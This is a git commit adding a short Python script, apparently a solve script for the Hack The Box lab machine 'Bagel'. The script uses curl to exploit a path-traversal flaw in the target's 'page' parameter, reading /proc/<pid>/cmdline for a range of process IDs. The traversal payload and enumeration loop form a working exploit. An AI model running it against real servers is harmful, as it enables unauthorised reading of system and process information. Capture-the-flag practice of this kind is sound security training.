06039965f456819eb4ec7daa56436e4379ea361c
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-02-19 02:40:32 +0100

    Create fuzz.py

---
+++ solvescript/htb/b2b/bagel/fuzz.py
@@ -0,0 +1,13 @@
+import os
+
+targeturl = "http://bagel.htb:8000/?page=../../../../../../proc/{}/cmdline"
+
+previous_output = ""
+for i in range(1, 5001):
+    cmdline_path = f"/proc/{i}/cmdline"
+    if os.path.exists(cmdline_path):
+        url = targeturl.format(i)
+        output = os.popen(f"curl -s {url}").read()
+        if 'File' not in output and output != previous_output:
+            print(output)
+            previous_output = output
